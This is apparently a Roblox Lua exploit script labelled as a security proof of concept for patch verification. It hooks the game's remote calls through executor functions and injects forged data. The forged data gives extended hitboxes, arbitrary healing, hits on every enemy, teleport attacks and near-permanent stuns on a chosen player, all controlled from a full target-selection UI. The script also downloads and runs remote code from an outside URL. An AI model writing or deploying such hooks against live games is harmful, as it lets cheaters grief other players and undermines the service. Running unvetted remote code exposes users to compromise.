--[[
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║                         LUNARITY SECURITY POC                             ║
    ║                Proof of Concept for Vulnerability Testing                 ║
    ║                         For Patch Verification Only                       ║
    ╚═══════════════════════════════════════════════════════════════════════════╝

    HOW IT WORKS:
    Server-side listeners only exist DURING skill execution. You can't just call
    FireServer directly - the skill must already be running. This PoC uses a
    namecall hook to intercept the client's legitimate skill usage and inject
    malicious data before it reaches the server.

    USAGE:
    1. Enable the hook toggles for the exploits you want to test
    2. Select a target player (for V29 victim injection)
    3. Use the skills NORMALLY in-game
    4. The hook intercepts your FireServer call and injects malicious data

    WORKING EXPLOITS (via hooks):
    - V04: enemiesDetected injection (PinpointShuriken 500 stud range!)
    - V10: SizeZ hitbox extension (directional range boost)
    - V03: Client position injection (Bind, Chilling Arc, Fiery Leap)
    - V13: Health restoration exploit (BladeStorm, Siphon skills)
    - V29: Client victim injection (Rise, Inferior, Anguish, Skewer, etc.)

    REQUIRES: hookmetamethod (Synapse X, Script-Ware, etc.)
]]

-- // Services
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera
local Unloaded = false
local Connections = {}

-- // UI Loading
local LunarityUI = loadstring(game:HttpGet("https://api.relayed.network/ui"))()
local Theme = LunarityUI.Theme

-- // State
local Settings = {
    -- V04: Enemy Injection
    V04_Enabled = false,
    V04_Skill = "PinpointShuriken", -- Best one: 500 stud range check

    -- V10: Extended Hitbox
    V10_Enabled = false,
    V10_SizeZ = 500, -- Directional range extension

    -- V03: Position Injection
    V03_Enabled = false,
    V03_Skill = "Chilling Arc",

    -- V13: Health Restoration
    V13_Enabled = false,
    V13_HealAmount = 100,

    -- V29: Victim Injection
    V29_Enabled = false,
    V29_Skill = "Anguish", -- 8-second stun
    V29_Duration = 9999, -- For Rise skill

    -- Target
    TargetName = nil,
    AttacherVisible = false,
}

-- // Remotes
local Remotes = ReplicatedStorage:FindFirstChild("Remotes")
local ClientInfoRemote = Remotes and Remotes:FindFirstChild("ClientInfo")

-- // Visual Indicator
local TargetIndicator = nil

local function CreateTargetIndicator()
    if TargetIndicator then TargetIndicator:Destroy() end

    TargetIndicator = Instance.new("Part")
    TargetIndicator.Name = "PoC_TargetIndicator"
    TargetIndicator.Size = Vector3.new(4, 0.5, 4)
    TargetIndicator.Shape = Enum.PartType.Cylinder
    TargetIndicator.Color = Color3.fromRGB(0, 255, 0)
    TargetIndicator.Material = Enum.Material.Neon
    TargetIndicator.Anchored = true
    TargetIndicator.CanCollide = false
    TargetIndicator.Transparency = 0.3
    TargetIndicator.CFrame = CFrame.new(0, -1000, 0)
    TargetIndicator.Parent = Workspace

    local billboard = Instance.new("BillboardGui")
    billboard.Size = UDim2.new(0, 120, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 4, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = TargetIndicator

    local label = Instance.new("TextLabel")
    label.Name = "Label"
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(0, 255, 0)
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.new(0, 0, 0)
    label.Font = Enum.Font.GothamBold
    label.TextSize = 14
    label.Text = "TARGET"
    label.Parent = billboard

    return TargetIndicator
end

local function UpdateTargetIndicator()
    if not TargetIndicator then CreateTargetIndicator() end

    if Settings.TargetName then
        local targetPlayer = Players:FindFirstChild(Settings.TargetName)
        if targetPlayer and targetPlayer.Character then
            local rootPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                TargetIndicator.CFrame = CFrame.new(rootPart.Position - Vector3.new(0, 3, 0)) * CFrame.Angles(0, 0, math.rad(90))
                TargetIndicator.Transparency = 0.3
                local label = TargetIndicator:FindFirstChild("BillboardGui") and TargetIndicator.BillboardGui:FindFirstChild("Label")
                if label then
                    label.Text = "TARGET: " .. Settings.TargetName
                end
                return
            end
        end
    end

    TargetIndicator.Transparency = 1
end

-- // Utility Functions
local function notify(msg)
    print("[LunarityPoC]: " .. tostring(msg))
end

local function addConnection(conn)
    table.insert(Connections, conn)
end

local function GetTargetCharacter()
    if Settings.TargetName then
        local targetPlayer = Players:FindFirstChild(Settings.TargetName)
        if targetPlayer and targetPlayer.Character then
            return targetPlayer.Character
        end
    end
    return nil
end

local function GetAllEnemies()
    local enemies = {}
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            if Settings.TargetName then
                if player.Name == Settings.TargetName then
                    table.insert(enemies, player.Character)
                end
            else
                table.insert(enemies, player.Character)
            end
        end
    end
    return enemies
end

-- ═══════════════════════════════════════════════════════════════════════════
-- V04: enemiesDetected Injection
-- Server trusts the client's enemy list!
-- PinpointShuriken: 500 stud range check (HUGE)
-- RapidIce: 25 stud range check (need to be closer)
--
-- IMPORTANT: These exploits work by HOOKING the client's FireServer calls.
-- The server listener only exists during skill execution, so we intercept
-- the client's legitimate skill usage and inject our malicious data.
-- ═══════════════════════════════════════════════════════════════════════════

local V04_SKILLS = {
    {name = "PinpointShuriken", range = 500, desc = "500 stud range - BEST"},
    {name = "RapidIce", range = 25, desc = "25 stud range - need to aim"},
}

-- Hook the ClientInfo remote to intercept all skill FireServer calls
local HookedFireServer = false
local OriginalNamecall = nil

local function SetupFireServerHook()
    if HookedFireServer then return end
    if not ClientInfoRemote then return end

    -- Use namecall hook for maximum compatibility
    if hookmetamethod then
        local oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
            local method = getnamecallmethod()
            local args = {...}

            if self == ClientInfoRemote and method == "FireServer" then
                local skillName = args[1]

                -- V04: Inject all enemies when using PinpointShuriken or RapidIce
                if Settings.V04_Enabled and (skillName == "PinpointShuriken" or skillName == "RapidIce") then
                    local enemies = GetAllEnemies()
                    if #enemies > 0 then
                        args[2] = { enemiesDetected = enemies }
                        notify("V04: Hooked " .. skillName .. " - injected " .. #enemies .. " targets!")
                        return oldNamecall(self, unpack(args))
                    end
                end

                -- V29: Inject victim when using victim-injection skills
                if Settings.V29_Enabled then
                    local targetChar = GetTargetCharacter()

                    if skillName == "Rise" and targetChar then
                        args[2] = targetChar
                        args[3] = Settings.V29_Duration
                        notify("V29: Hooked Rise - victim: " .. targetChar.Name .. ", duration: " .. Settings.V29_Duration)
                        return oldNamecall(self, unpack(args))

                    elseif skillName == "Inferior" and targetChar then
                        args[2] = targetChar
                        notify("V29: Hooked Inferior - victim: " .. targetChar.Name)
                        return oldNamecall(self, unpack(args))

                    elseif skillName == "Anguish" and targetChar then
                        args[2] = targetChar
                        notify("V29: Hooked Anguish - victim: " .. targetChar.Name)
                        return oldNamecall(self, unpack(args))

                    elseif skillName == "Skewer" and targetChar then
                        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                        if targetRoot then
                            args[2] = { ClientCF = targetRoot.CFrame }
                            notify("V29: Hooked Skewer - teleporting to " .. targetChar.Name)
                            return oldNamecall(self, unpack(args))
                        end

                    elseif (skillName == "BodySlam" or skillName == "Siphon" or skillName == "RapidJabs") and targetChar then
                        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                        if targetRoot then
                            args[2] = targetRoot.CFrame
                            notify("V29: Hooked " .. skillName .. " - teleporting to " .. targetChar.Name)
                            return oldNamecall(self, unpack(args))
                        end

                    elseif (skillName == "AerialSmite" or skillName == "Entry") and targetChar then
                        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                        if targetRoot then
                            args[2] = { ClientCF = targetRoot.CFrame }
                            notify("V29: Hooked " .. skillName .. " - attack at " .. targetChar.Name)
                            return oldNamecall(self, unpack(args))
                        end
                    end
                end

                -- V10: Inject extended SizeZ
                if Settings.V10_Enabled and (skillName == "Agressive Breeze" or skillName == "Quick Breeze") then
                    if type(args[2]) == "table" then
                        args[2].SizeZ = Settings.V10_SizeZ
                        notify("V10: Hooked " .. skillName .. " - SizeZ=" .. Settings.V10_SizeZ)
                        return oldNamecall(self, unpack(args))
                    end
                end

                -- V03: Inject position at target
                if Settings.V03_Enabled then
                    local targetChar = GetTargetCharacter()
                    if targetChar then
                        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                        if targetRoot then
                            if skillName == "Bind" then
                                args[2] = targetRoot.CFrame
                                notify("V03: Hooked Bind - position at " .. targetChar.Name)
                                return oldNamecall(self, unpack(args))
                            elseif skillName == "Chilling Arc" and type(args[2]) == "table" then
                                args[2].IndicatorCF = targetRoot.CFrame
                                notify("V03: Hooked Chilling Arc - position at " .. targetChar.Name)
                                return oldNamecall(self, unpack(args))
                            elseif skillName == "Fiery Leap" and type(args[2]) == "table" then
                                args[2].ExplosionPosition = targetRoot.Position
                                notify("V03: Hooked Fiery Leap - position at " .. targetChar.Name)
                                return oldNamecall(self, unpack(args))
                            elseif (skillName == "Concept" or skillName == "Snow Cloak") and type(args[2]) == "table" then
                                args[2].TeleportPosition = targetRoot.Position
                                notify("V03: Hooked " .. skillName .. " - position at " .. targetChar.Name)
                                return oldNamecall(self, unpack(args))
                            end
                        end
                    end
                end

                -- V13: Inject health restoration amount
                if Settings.V13_Enabled and (skillName == "BladeStorm" or skillName == "SuperSiphon" or skillName == "RapidBlinks") then
                    args[2] = Settings.V13_HealAmount
                    notify("V13: Hooked " .. skillName .. " - heal amount=" .. Settings.V13_HealAmount)
                    return oldNamecall(self, unpack(args))
                end
            end

            return oldNamecall(self, ...)
        end)

        OriginalNamecall = oldNamecall
        HookedFireServer = true
        notify("Hook installed! Use skills normally - data will be injected automatically.")
    else
        notify("WARNING: hookmetamethod not available. Manual firing may not work.")
    end
end

-- Legacy function for manual testing (won't work without skill running)
local function FireV04_EnemyInjection(skillName)
    if not ClientInfoRemote then return end

    local enemies = GetAllEnemies()
    if #enemies == 0 then
        notify("V04: No targets available")
        return
    end

    -- Note: This only works if the skill is already running on server!
    ClientInfoRemote:FireServer(skillName, {
        enemiesDetected = enemies
    })

    local targetNames = {}
    for _, char in pairs(enemies) do
        table.insert(targetNames, char.Name)
    end
    notify("V04 Manual: Fired " .. skillName .. " (only works if skill already active!)")
end

-- ═══════════════════════════════════════════════════════════════════════════
-- V10: SizeZ Hitbox Extension
-- Server uses client's SizeZ for hitbox dimensions
-- Creates a DIRECTIONAL hitbox (not a sphere!)
-- Quick Breeze: Vector3.new(6, 6, SizeZ) - 6x6 cross section
-- Aggressive Breeze: Vector3.new(25, 25, SizeZ) - 25x25 cross section
-- ═══════════════════════════════════════════════════════════════════════════

local V10_SKILLS = {
    {name = "Quick Breeze", baseSize = "6x6", desc = "Smaller hitbox, faster"},
    {name = "Agressive Breeze", baseSize = "25x25", desc = "Bigger hitbox, slower"},
}

local function FireV10_ExtendedHitbox(skillName, sizeZ)
    if not ClientInfoRemote then return end

    local character = LocalPlayer.Character
    if not character then return end
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end

    -- The hitbox extends in the direction you're facing
    -- So aim at your target for maximum effect!
    ClientInfoRemote:FireServer(skillName, {
        SizeZ = sizeZ or Settings.V10_SizeZ,
        CF = rootPart.CFrame
    })

    notify("V10: Fired " .. skillName .. " with SizeZ=" .. tostring(sizeZ or Settings.V10_SizeZ) .. " (aim at target!)")
end

-- ═══════════════════════════════════════════════════════════════════════════
-- V03: Client Position Injection
-- Server places hitbox at client-specified position
-- Bind: arg3 CFrame directly
-- Chilling Arc: arg3.IndicatorCF
-- Fiery Leap: arg3.ExplosionPosition
-- ═══════════════════════════════════════════════════════════════════════════

local V03_SKILLS = {
    {name = "Bind", param = "CFrame", desc = "Direct CFrame placement"},
    {name = "Chilling Arc", param = "IndicatorCF", desc = "Ice arc at position"},
    {name = "Fiery Leap", param = "ExplosionPosition", desc = "Explosion at position"},
    {name = "Concept", param = "TeleportPosition", desc = "Teleport + damage"},
    {name = "Snow Cloak", param = "TeleportPosition", desc = "Teleport to position"},
}

local function FireV03_PositionInjection(skillName)
    if not ClientInfoRemote then return end

    local targetChar = GetTargetCharacter()
    if not targetChar then
        notify("V03: Select a target first!")
        return
    end

    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
    if not targetRoot then return end

    local targetCF = targetRoot.CFrame
    local targetPos = targetRoot.Position

    if skillName == "Bind" then
        ClientInfoRemote:FireServer("Bind", targetCF)
    elseif skillName == "Chilling Arc" then
        ClientInfoRemote:FireServer("Chilling Arc", {
            IndicatorCF = targetCF
        })
    elseif skillName == "Fiery Leap" then
        ClientInfoRemote:FireServer("Fiery Leap", {
            ExplosionPosition = targetPos
        })
    elseif skillName == "Concept" then
        ClientInfoRemote:FireServer("Concept", {
            TeleportPosition = targetPos
        })
    elseif skillName == "Snow Cloak" then
        ClientInfoRemote:FireServer("Snow Cloak", {
            TeleportPosition = targetPos
        })
    end

    notify("V03: Fired " .. skillName .. " at " .. Settings.TargetName)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- V13: Health Restoration Exploit
-- Server adds client-controlled value to player health!
-- BladeStorm: Humanoid.Health += arg3 (Siphon function)
-- SuperSiphon: Humanoid.Health += arg3
-- RapidBlinks: Humanoid.Health += arg3
-- PinpointShuriken: Also has healing
-- ═══════════════════════════════════════════════════════════════════════════

local V13_SKILLS = {
    {name = "BladeStorm", desc = "Siphon healing - best one"},
    {name = "SuperSiphon", desc = "Super siphon healing"},
    {name = "RapidBlinks", desc = "Rapid blinks healing"},
}

local function FireV13_HealthRestore(healAmount)
    if not ClientInfoRemote then return end

    -- These skills expect arg3 to be the heal amount
    -- The server does: Humanoid.Health += arg3

    local amount = healAmount or Settings.V13_HealAmount

    -- BladeStorm's Siphon function is the most reliable
    -- It's called during the skill execution
    ClientInfoRemote:FireServer("BladeStorm", amount)

    notify("V13: Requested " .. tostring(amount) .. " healing via BladeStorm")
end

-- Alternative: Fire multiple healing skills
local function FireV13_MassHeal(healAmount)
    if not ClientInfoRemote then return end

    local amount = healAmount or Settings.V13_HealAmount

    -- Fire all healing skills
    ClientInfoRemote:FireServer("BladeStorm", amount)
    task.wait(0.1)
    ClientInfoRemote:FireServer("SuperSiphon", amount)
    task.wait(0.1)
    ClientInfoRemote:FireServer("RapidBlinks", amount)

    notify("V13: Mass heal fired (" .. tostring(amount) .. " x3 skills)")
end

-- ═══════════════════════════════════════════════════════════════════════════
-- V29: Client Victim Injection
-- Server trusts client-provided victim character!
-- Pattern A: Direct victim injection (Rise, Inferior, Anguish)
-- Pattern B: CFrame affecting both players (Skewer)
-- Pattern C: CFrame teleport + AoE (BodySlam, Siphon, RapidJabs)
-- Pattern D: Attack origin control (AerialSmite, Entry)
-- ═══════════════════════════════════════════════════════════════════════════

local V29_SKILLS = {
    -- Pattern A: Direct victim injection
    {name = "Rise", pattern = "A", desc = "Victim + Duration (PERMASTUN)", hasDuration = true},
    {name = "Inferior", pattern = "A", desc = "4-sec stun + damage"},
    {name = "Anguish", pattern = "A", desc = "8-sec stun lock - BEST"},

    -- Pattern B: Dual player CFrame control
    {name = "Skewer", pattern = "B", desc = "Teleports BOTH players"},

    -- Pattern C: CFrame teleport + AoE
    {name = "BodySlam", pattern = "C", desc = "Teleport + AoE damage"},
    {name = "Siphon", pattern = "C", desc = "Teleport + AoE stun"},
    {name = "RapidJabs", pattern = "C", desc = "Teleport + grab combo"},

    -- Pattern D: Attack origin control
    {name = "AerialSmite", pattern = "D", desc = "Tornado at position"},
    {name = "Entry", pattern = "D", desc = "Hitbox at position"},
}

local function FireV29_VictimInjection(skillName, duration)
    if not ClientInfoRemote then return end

    local targetChar = GetTargetCharacter()
    if not targetChar and (skillName == "Rise" or skillName == "Inferior" or skillName == "Anguish") then
        notify("V29: Select a target first for " .. skillName)
        return
    end

    local character = LocalPlayer.Character
    if not character then return end
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end

    -- Pattern A: Direct victim injection
    if skillName == "Rise" then
        -- Rise: arg3 = victim, arg4 = duration
        -- Server does: applyStatus(arg3, "Stunned", arg4 + 1)
        local dur = duration or Settings.V29_Duration
        ClientInfoRemote:FireServer("Rise", targetChar, dur)
        notify("V29: Rise on " .. targetChar.Name .. " for " .. tostring(dur) .. " seconds!")

    elseif skillName == "Inferior" then
        -- Inferior: arg3 = victim
        -- Server does: applyDamage + 4-sec stun
        ClientInfoRemote:FireServer("Inferior", targetChar, rootPart.CFrame)
        notify("V29: Inferior on " .. targetChar.Name)

    elseif skillName == "Anguish" then
        -- Anguish: arg3 = victim
        -- Server does: 8-sec stun + weld + continuous damage
        ClientInfoRemote:FireServer("Anguish", targetChar)
        notify("V29: Anguish 8-sec lock on " .. targetChar.Name)

    -- Pattern B: Dual player CFrame control
    elseif skillName == "Skewer" then
        -- Skewer: arg3.ClientCF positions BOTH players!
        local targetCF = rootPart.CFrame
        if targetChar then
            local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                targetCF = targetRoot.CFrame
            end
        end
        ClientInfoRemote:FireServer("Skewer", {
            ClientCF = targetCF
        })
        notify("V29: Skewer dual teleport!")

    -- Pattern C: CFrame teleport + AoE
    elseif skillName == "BodySlam" then
        local targetCF = rootPart.CFrame
        if targetChar then
            local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                targetCF = targetRoot.CFrame
            end
        end
        ClientInfoRemote:FireServer("BodySlam", targetCF)
        notify("V29: BodySlam teleport!")

    elseif skillName == "Siphon" then
        local targetCF = rootPart.CFrame
        if targetChar then
            local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                targetCF = targetRoot.CFrame
            end
        end
        ClientInfoRemote:FireServer("Siphon", targetCF)
        notify("V29: Siphon teleport!")

    elseif skillName == "RapidJabs" then
        local targetCF = rootPart.CFrame
        if targetChar then
            local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                targetCF = targetRoot.CFrame
            end
        end
        ClientInfoRemote:FireServer("RapidJabs", targetCF)
        notify("V29: RapidJabs teleport!")

    -- Pattern D: Attack origin control
    elseif skillName == "AerialSmite" then
        local targetCF = rootPart.CFrame + Vector3.new(0, 50, 0)
        if targetChar then
            local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                targetCF = targetRoot.CFrame + Vector3.new(0, 50, 0)
            end
        end
        ClientInfoRemote:FireServer("AerialSmite", {
            ClientCF = targetCF
        })
        notify("V29: AerialSmite at target!")

    elseif skillName == "Entry" then
        local targetCF = rootPart.CFrame
        if targetChar then
            local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                targetCF = targetRoot.CFrame
            end
        end
        ClientInfoRemote:FireServer("Entry", {
            ClientCF = targetCF
        })
        notify("V29: Entry at target!")
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- Auto-Loops and Hook Setup
-- ═══════════════════════════════════════════════════════════════════════════

-- NOTE: The old auto-firing loops have been removed because they don't work!
-- Server-side listeners only exist during skill execution.
-- Instead, we use a namecall hook that intercepts the client's legitimate
-- FireServer calls and injects our malicious data.

-- Initialize the hook when script loads
task.spawn(function()
    task.wait(1) -- Wait for remotes to be ready
    SetupFireServerHook()
end)

-- Target indicator update loop
task.spawn(function()
    CreateTargetIndicator()
    while not Unloaded do
        UpdateTargetIndicator()
        task.wait(0.1)
    end
end)

-- ═══════════════════════════════════════════════════════════════════════════
-- UI
-- ═══════════════════════════════════════════════════════════════════════════

local UpdateSelectorVisuals = nil

local function createSelectorUI()
    local selectorWindow = LunarityUI.CreateWindow({
        Name = "Lunarity_PoC_Selector",
        Title = "Target",
        Subtitle = "Selector",
        Size = UDim2.new(0, 200, 0, 300),
        Position = UDim2.new(0, 20, 0.5, -150),
        Closable = false,
        Minimizable = false
    })

    selectorWindow.ScreenGui.Enabled = false

    if syn and syn.protect_gui then
        syn.protect_gui(selectorWindow.ScreenGui)
    end

    local playerList = selectorWindow.createPlayerList("Players", 220,
        function(player)
            Settings.TargetName = player.Name
            local char = player.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum then
                Camera.CameraSubject = hum
            end
            notify("Target: " .. player.Name)
            if UpdateSelectorVisuals then UpdateSelectorVisuals() end
        end,
        nil
    )

    UpdateSelectorVisuals = function()
        playerList.refresh(
            function(p) return Settings.TargetName == p.Name end,
            function(p) return false end
        )
    end

    task.spawn(function()
        while not Unloaded do
            if Settings.AttacherVisible then
                UpdateSelectorVisuals()
            end
            task.wait(2)
        end
    end)

    return selectorWindow
end

local function createMenu()
    local window = LunarityUI.CreateWindow({
        Name = "Lunarity_PoC",
        Title = "Security PoC",
        Subtitle = "Patch Testing",
        Size = UDim2.new(0, 380, 0, 550),
        Position = UDim2.new(0.5, -190, 0.5, -275),
    })

    if syn and syn.protect_gui then
        syn.protect_gui(window.ScreenGui)
    end

    -- ═══════════════════════════════════════════════════════════════════════
    -- V04: Enemy Injection Section
    -- ═══════════════════════════════════════════════════════════════════════
    window.createSection("V04: Enemy Injection (HOOK)")

    window.createToggle("V04 Hook (use skill normally)", Settings.V04_Enabled, function(val)
        Settings.V04_Enabled = val
        notify("V04 Hook: " .. (val and "ON - use PinpointShuriken to hit all enemies!" or "OFF"))
    end)

    local v04SkillLabel = window.createLabelValue("Hooked Skills", "PinpointShuriken, RapidIce")

    window.createButton("Test V04 (manual - only if skill active)", function()
        FireV04_EnemyInjection("PinpointShuriken")
    end)

    -- ═══════════════════════════════════════════════════════════════════════
    -- V10: Extended Hitbox Section
    -- ═══════════════════════════════════════════════════════════════════════
    window.createSection("V10: Extended Hitbox (HOOK)")

    window.createToggle("V10 Hook (use Breeze skills)", Settings.V10_Enabled, function(val)
        Settings.V10_Enabled = val
        notify("V10 Hook: " .. (val and "ON - use Breeze skills to extend range!" or "OFF"))
    end)

    local v10SizeLabel = window.createLabelValue("SizeZ", tostring(Settings.V10_SizeZ))

    window.createButton("SizeZ = 100 (Short)", function()
        Settings.V10_SizeZ = 100
        v10SizeLabel.setValue("100")
    end)

    window.createButton("SizeZ = 500 (Medium)", function()
        Settings.V10_SizeZ = 500
        v10SizeLabel.setValue("500")
    end)

    window.createButton("SizeZ = 2000 (Long)", function()
        Settings.V10_SizeZ = 2000
        v10SizeLabel.setValue("2000")
    end)

    -- ═══════════════════════════════════════════════════════════════════════
    -- V03: Position Injection Section
    -- ═══════════════════════════════════════════════════════════════════════
    window.createSection("V03: Position Injection (HOOK)")

    window.createToggle("V03 Hook (use position skills)", Settings.V03_Enabled, function(val)
        Settings.V03_Enabled = val
        notify("V03 Hook: " .. (val and "ON - use Bind/Chilling Arc/etc to hit target!" or "OFF"))
    end)

    local v03SkillLabel = window.createLabelValue("Hooked Skills", "Bind, Chilling Arc, Fiery Leap, etc")

    -- ═══════════════════════════════════════════════════════════════════════
    -- V13: Health Restoration Section
    -- ═══════════════════════════════════════════════════════════════════════
    window.createSection("V13: Health Exploit (HOOK)")

    window.createToggle("V13 Hook (use healing skills)", Settings.V13_Enabled, function(val)
        Settings.V13_Enabled = val
        notify("V13 Hook: " .. (val and "ON - use BladeStorm/Siphon to heal!" or "OFF"))
    end)

    local v13AmountLabel = window.createLabelValue("Heal Amount", tostring(Settings.V13_HealAmount))

    window.createButton("Heal 50 HP", function()
        Settings.V13_HealAmount = 50
        v13AmountLabel.setValue("50")
    end)

    window.createButton("Heal 100 HP", function()
        Settings.V13_HealAmount = 100
        v13AmountLabel.setValue("100")
    end)

    window.createButton("Heal 500 HP (Test Max)", function()
        Settings.V13_HealAmount = 500
        v13AmountLabel.setValue("500")
    end)

    -- ═══════════════════════════════════════════════════════════════════════
    -- V29: Victim Injection Section
    -- ═══════════════════════════════════════════════════════════════════════
    window.createSection("V29: Victim Injection (HOOK)")

    window.createToggle("V29 Hook (needs target selected)", Settings.V29_Enabled, function(val)
        Settings.V29_Enabled = val
        notify("V29 Hook: " .. (val and "ON - use Rise/Anguish/etc to hit target!" or "OFF"))
    end)

    local v29SkillLabel = window.createLabelValue("Hooked Skills", "Rise, Inferior, Anguish, Skewer, etc")
    local v29DurationLabel = window.createLabelValue("Duration (for Rise)", tostring(Settings.V29_Duration))

    -- Duration control for Rise
    window.createButton("Duration: 10 sec", function()
        Settings.V29_Duration = 10
        v29DurationLabel.setValue("10")
    end)

    window.createButton("Duration: 9999 sec (PERMASTUN)", function()
        Settings.V29_Duration = 9999
        v29DurationLabel.setValue("9999")
    end)

    -- ═══════════════════════════════════════════════════════════════════════
    -- Target & Settings Section
    -- ═══════════════════════════════════════════════════════════════════════
    window.createSection("Target & Settings")

    local selectorWindow = createSelectorUI()

    local targetLabel = window.createLabelValue("Current Target", "None")

    window.createToggle("Show Target List", Settings.AttacherVisible, function(val)
        Settings.AttacherVisible = val
        if selectorWindow then selectorWindow.ScreenGui.Enabled = val end
        if val then UpdateSelectorVisuals() end
    end)

    window.createButton("Reset Target (All Players)", function()
        Settings.TargetName = nil
        targetLabel.setValue("All Players")
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then Camera.CameraSubject = hum end
        if UpdateSelectorVisuals then UpdateSelectorVisuals() end
        notify("Target reset to ALL")
    end)

    -- Update target label
    task.spawn(function()
        while not Unloaded do
            targetLabel.setValue(Settings.TargetName or "All Players")
            task.wait(0.5)
        end
    end)

    window.createButton("Unload Script", function()
        Unloaded = true
        if TargetIndicator then TargetIndicator:Destroy() end
        if selectorWindow then selectorWindow.destroy() end
        window.destroy()
        for _, c in pairs(Connections) do c:Disconnect() end
        notify("Unloaded.")
    end)

    return window.ScreenGui
end

-- // Initialize
createMenu()
notify("Security PoC Loaded - HOOK-BASED exploits ready!")
notify("IMPORTANT: Enable hooks, select target, then USE SKILLS NORMALLY")
notify("The hook intercepts your skill usage and injects malicious data")
notify("V04: PinpointShuriken/RapidIce -> hits all enemies")
notify("V29: Rise/Anguish/Inferior -> targets selected player")
